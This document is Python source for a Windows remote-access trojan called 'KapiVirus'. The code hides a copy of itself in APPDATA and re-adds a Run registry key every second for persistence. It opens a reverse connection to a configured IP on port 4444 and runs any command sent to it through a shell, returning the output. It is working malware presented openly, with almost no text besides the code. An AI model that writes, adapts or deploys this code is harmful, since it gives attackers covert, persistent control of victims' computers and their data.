import socket
import subprocess
import os
import sys
import shutil
import winreg
import time
import threading

SERVER_IP = "insert victims public ip" 
PORT = 4444
FILENAME = "KapiVirus.exe"
APP_NAME = "KapiService"
TRIGGER = "Kapi/"

def gain_persistence():
    try:
        app_path = sys.executable
        target_dir = os.getenv('APPDATA')
        destination = os.path.join(target_dir, FILENAME)
        
        if not os.path.exists(destination):
            shutil.copyfile(app_path, destination)
            os.system(f'attrib +h "{destination}"')

        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, f'"{destination}"')
        winreg.CloseKey(key)
    except:
        pass

def persistence_watchdog():
    while True:
        gain_persistence()
        time.sleep(1)

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, PORT))
            
            while True:
                raw_data = s.recv(1024).decode("utf-8").strip()
                if not raw_data: break

                if raw_data.startswith(TRIGGER):
                    command = raw_data[len(TRIGGER):]

                    if command.lower() == "exit":
                        s.close()
                        return

                    elif command.startswith("cd "):
                        try:
                            os.chdir(command[3:])
                            s.send(os.getcwd().encode())
                        except Exception as e:
                            s.send(str(e).encode())
                    else:
                        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        output = proc.stdout.read() + proc.stderr.read()
                        s.send(output if output else b"Command executed.")
                else:
                    continue
        except:
            time.sleep(10)

if __name__ == "__main__":
    threading.Thread(target=persistence_watchdog, daemon=True).start()
    connect()